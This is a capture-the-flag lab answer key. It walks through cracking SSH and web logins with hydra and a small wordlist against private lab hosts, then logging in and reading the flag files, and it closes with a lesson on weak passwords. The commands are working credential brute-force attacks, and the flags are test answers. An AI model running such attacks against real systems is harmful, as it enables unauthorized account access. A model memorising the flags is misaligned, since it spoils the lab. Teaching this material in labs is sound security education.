# Lab 6 — CTF Walkthrough (Answer Key)

## Step 1: Brute-force SSH accounts

```bash
hydra -L <(printf "admin\nuser1\n") -P /wordlists/basic.txt ssh://10.10.6.10
```

Recovers `admin:letmein` and `user1:qwerty` (both are in `/wordlists/basic.txt`).

## Step 2: user.txt

```bash
ssh admin@10.10.6.10
# password: letmein
cat user.txt
```

Flag: `flag{lab6_password_cracked_ssh}`

## Step 3: root.txt

```bash
ssh user1@10.10.6.10
# password: qwerty
cat root.txt
```

Flag: `flag{lab6_rockyou_wordlist_win}`

## Bonus: web login flag

```bash
hydra -l admin -P /wordlists/basic.txt 10.10.6.11 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid username or password"
curl -s -X POST -d "user=admin&pass=letmein" http://10.10.6.11/login
```

Response includes: `flag{lab6_hydra_web_login_cracked}`

## Lesson

Every credential here was in a 10-entry wordlist. Real breach-derived wordlists (rockyou.txt has 14 million+ entries) make this dramatically worse for weak passwords — which is why "complex enough to resist a wordlist" is a much lower bar than most people think.
